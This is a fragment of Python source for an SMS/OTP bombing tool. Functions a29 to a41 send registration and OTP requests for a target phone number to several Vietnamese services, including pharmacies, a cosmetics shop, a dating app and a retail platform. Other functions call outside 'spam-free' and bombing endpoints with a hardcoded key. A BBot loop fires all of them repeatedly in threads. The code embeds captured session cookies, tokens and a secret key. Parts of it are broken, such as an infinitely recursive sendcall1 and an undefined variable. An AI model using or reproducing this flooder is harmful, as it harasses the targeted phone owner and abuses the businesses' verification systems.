def a29(phone):
  headers = {
        'authority': 'v3.meeyid.com',
    'accept': '*/*',
    'accept-language': 'vi-VN',
    'content-type': 'application/json',
    'origin': 'https://meeyland.com',
    'referer': 'https://meeyland.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-affilate-id': 'www.google.com',
    'x-browser-id': 'undefined',
    'x-client-id': 'meeyland',
    'x-partner-id': '',
}
  json_data = {
    'phone': phone,
    'phoneCode': '+84',
    'refCode': '',
}

  response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data)
def a30(phone):
  headers = {
        'authority': 'api-gateway.pharmacity.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.pharmacity.vn',
    'referer': 'https://www.pharmacity.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
  json_data = {
    'phone': phone,
    'referral': '',
}

  response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
def a31(phone):
    cookies = {
        'PHPSESSID': '996ae61e649094dbb915904da6caa1af',
    'cf_clearance': 'UtxyFOExpziBxUf7QTY1kmQSu.MAyMANonwSFFzffUM-1692958915-0-1-e24599fd.d8e00433.a3dfd0b2-0.2.1692958915',
    }

    headers = {
        'authority': 'duong.codes',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=996ae61e649094dbb915904da6caa1af; cf_clearance=UtxyFOExpziBxUf7QTY1kmQSu.MAyMANonwSFFzffUM-1692958915-0-1-e24599fd.d8e00433.a3dfd0b2-0.2.1692958915',
    'origin': 'https://duong.codes',
    'referer': 'https://duong.codes/client/sms-free',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'csrf_token': 'dcffa98daee2515da2ed425aff669f02f67155f32b73351db11ebec1571f7b31',
    }

    response = requests.post('https://duong.codes/cron/spam-free.php', cookies=cookies, headers=headers, data=data)
def a32(phone):
    cookies = {
        'PHPSESSID': 'mdkgq217qt8lbl3ia326h8eaf3',
    'sessionChecked': '1692961077',
    'UUID': '512b367a-fb09-432f-99e9-08396c01e691',
    'HASAKI_SESSID': '14c50fb2d274fc4f1686a123dcb4f4af',
    'form_key': '14c50fb2d274fc4f1686a123dcb4f4af',
    'isVisibleModal': '1',
    'form_key': '14c50fb2d274fc4f1686a123dcb4f4af',
    'G_ENABLED_IDPS': 'google',
    '_ga': 'GA1.2.1981571496.1692961275',
    '_gid': 'GA1.2.1167033833.1692961275',
    '_gat': '1',
    }

    headers = {
        'authority': 'hasaki.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    # 'cookie': 'PHPSESSID=mdkgq217qt8lbl3ia326h8eaf3; sessionChecked=1692961077; UUID=512b367a-fb09-432f-99e9-08396c01e691; HASAKI_SESSID=14c50fb2d274fc4f1686a123dcb4f4af; form_key=14c50fb2d274fc4f1686a123dcb4f4af; isVisibleModal=1; form_key=14c50fb2d274fc4f1686a123dcb4f4af; G_ENABLED_IDPS=google; _ga=GA1.2.1981571496.1692961275; _gid=GA1.2.1167033833.1692961275; _gat=1',
    'referer': 'https://hasaki.vn/customer/account/create?ref1=https%3A%2F%2Fhasaki.vn%2Fsales%2Forder%2Fhistory',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'username': phone,
    'accessToken': '',
    'cartId': '',
    'form_key': '14c50fb2d274fc4f1686a123dcb4f4af',
    }

    response = requests.get('https://hasaki.vn/wap/v2/customer/account/code', params=params, cookies=cookies, headers=headers)
def a33(phone):
    headers = {
        'authority': 'api.ymeet.me',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjowLCJpcF9hZGRyZXNzIjpudWxsLCJpYXQiOjE0ODIzOTEyOTcsImV4cCI6ODk0NzM1MTI5N30.mu8vXYKUa4d1h4FzDxlS6v1D8gj5_ICqPKFMkzxEZkE',
    'origin': 'https://m.ymeet.me',
    'referer': 'https://m.ymeet.me/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phone_number': phone,
    }

    response = requests.get('https://api.ymeet.me/phone_check', params=params, headers=headers)
def a34(phone):
    headers = {
        'authority': 'gw.saladin.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'null',
    'content-type': 'application/json',
    'origin': 'https://id.saladin.vn',
    'referer': 'https://id.saladin.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phone': phone,
    }

    response = requests.post('https://gw.saladin.vn/api/v1/saladin-user/public/phone-account', headers=headers, json=json_data)
def a35(phone):
    headers = {
        'authority': 'api.finan.cc',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://ngocphong.com',
    'referer': 'https://ngocphong.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone_number': phone,
    'platform': 'buyer_web',
    'device_id': '78d57ee7-be70-4e8a-811d-2381939ca3f3',
    'secret_key': '5b70d65ba8953dabe4fdbfd6010a2673d88798c6065dfa49badd1f4917b33c195da9ec090be7a972d5dc628c26d849749c',
    }

    response = requests.post('https://api.finan.cc/finan-user/api/v1/auth/otp/generate', headers=headers, json=json_data)
def a36(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Ngọc Phong',
        'email': 'phonggayoccho@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': 'phone',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "phone",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
def mhl(phone):
    response = requests.get(f"https://onlytris-service.x10.mx/WEB/api new.php?key=Phonggayvl&phone={phone}")
def a37(phone):
    response = requests.get(f"https://onlytris-service.x10.mx/WEB/api new.php?key=Phonggayvl&phone={phone}")
def a38(phone):
    response = requests.get(f"https://onlytris-service.x10.mx/WEB/api new.php?key=Phonggayvl&phone={phone}")
def a39(phone):
    response = requests.get(f"https://onlytris-service.x10.mx/WEB/api new.php?key==Phonggayvl&phone={phone}")
def a40(phone):
    response = requests.get(f"https://onlytris-service.x10.mx/WEB/api new.php?key=Phonggayvl&phone={phone}")
def a41(phone):
	headers = {
    'authority': 'api.nhathuoclongchau.com.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'authorization': '',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-channel': 'EStore',
}

	json_data = {
    'phoneNumber': phone,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
}

	response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
)
def sendcall1(phone):
    while True:
        sendcall1(phone)
    time.sleep(0)
    for b in range(amount):
            exit()
def BBot(phone, amount):
   for i in range(amount):
      threading.submit(sendcall1,phone)
      threading.submit(mhl,phone)
      threading.submit(a0,phone)
      threading.submit(a1,phone)
      threading.submit(a2,phone)
      threading.submit(a3,phone)
      threading.submit(a4,phone)
      threading.submit(a5,phone)
      threading.submit(a6,phone)
      threading.submit(a7,phone)
      threading.submit(a8,phone)
      threading.submit(a9,phone)
      threading.submit(a10,phone)
      threading.submit(a11,phone)
      threading.submit(a12,phone)
      threading.submit(a13,phone)
      threading.submit(a14,phone)
      threading.submit(a15,phone)
      threading.submit(a16,phone)
      threading.submit(a17,phone)
      threading.submit(a18,phone)
      threading.submit(a19,phone)
      threading.submit(a20,phone)
      threading.submit(a21,phone)
      threading.submit(a22,phone)
      threading.submit(a23,phone)
      threading.submit(a24,phone)
      threading.submit(a25,phone)
      threading.submit(a26,phone)
      threading.submit(a27,phone)
      threading.submit(a28,phone)
      threading.submit(a29,phone)
      threading.submit(a30,phone)
      threading.submit(a31,phone)
      threading.submit(a32,phone)
      threading.submit(a33,phone)
      threading.submit(a34,phone)
      threading.submit(a35,phone)
      threading.submit(a36,phone)
      threading.submit(a33,phone)
      threading.submit(a37,phone)
      threading.submit(a38,phone)
      threading.submit(a39,phone)
      threading.submit(a40,phone)
      threading.submit(a41,phone)
BBot(phone, amount)